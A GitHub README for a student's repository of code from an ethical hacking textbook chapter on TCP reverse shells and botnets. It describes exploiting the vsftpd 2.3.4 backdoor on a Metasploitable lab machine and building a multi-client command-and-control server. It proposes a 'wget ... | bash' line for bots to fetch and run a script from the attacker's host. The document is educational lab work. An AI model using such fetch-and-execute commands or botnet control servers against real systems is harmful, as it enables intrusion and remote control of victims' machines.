# botNet
All of the code from Chapter 4 of Ethical Hacking: A Hands on Introduction to Breaking In. Chapter 4 is titled: Crafting TCP Shells and Botnets  


In this chapter, we are taught about sockets and process communication. It explains how TCP handshakes work the type/way packets are exchanged between the client and the server. We then are taught about what a TCP reverse shell is. It is explained that since a lot of firewalls allow outgoing connections only, the solution as an attacker is to install a reverse shell on the victim machine that connects to the command and control server outside the network. Once this connection is made, you can send commands to the victim which are then executed.  It then gives us a diagram that shows how this works/is going to work as we work in the chapter. You can view it as 'diagram.png'.  

We then were taught how to use nmap to scan for open ports. We learned about some different scan types and flags for nmap, as well as the pros and cons of them. On the metasploitable server, we located an open tcp port 21 which has a vulnerable version of vsftpd (2.3.4) running. This is what we are going to exploit to gain access to the metasploitable machine so that we can load our reverse shell onto it. It is a backdoor that starts a shell running on port 6200 which we connect to and download reverseShell.py onto the victim machine.  

We also have to create a TCP server that does 2 main things and functions as our command and control server: shellServer.py
1. accept connection from client
2. send and receive commands
The problem with this TCP server is that it can only handle one connection. If our goal is to create a network of victim clients (botnet) then we need to have a TCP server that can handle multiple connections.

We create another TCP server that can handle multiple connections and the idea is that instead of sending and receiving individual commands to each bot, we want the bot to all receive the same command. After our command and control server receives a response, we want it to print the bot's IP address and the result of executing the command. What I have so far is in shellServerMulti.py.  The exercise is considered completed when this server reads from a file and sends the commands in that file to the clients. I know there are probably a lot of ways this can be done, but what i've done is have the filepath passed in as an argument when you start the server for example:  
```
kali@kali:~$ python3 shellServerMulti.py <filepath>
```
For some reason this is not working. I also am thinking that we can just execute this command once we have the client connect since we are using a reverse shell anyway:  
```
kali@kali~$ wget -O - <IP ADDRESS>:PORT/filepath/file.sh | bash
```
This could encapsulate the commands outside of the server code (this idea came to me this morning as I was putting together this github) and I wouldn't have to worry about parsing the file in python at all. The code would be super clean.  

Thank you for anyone taking the time to look over this stuff and offer advice, pointers, or contributions. Feel free to use and abuse all of this code.
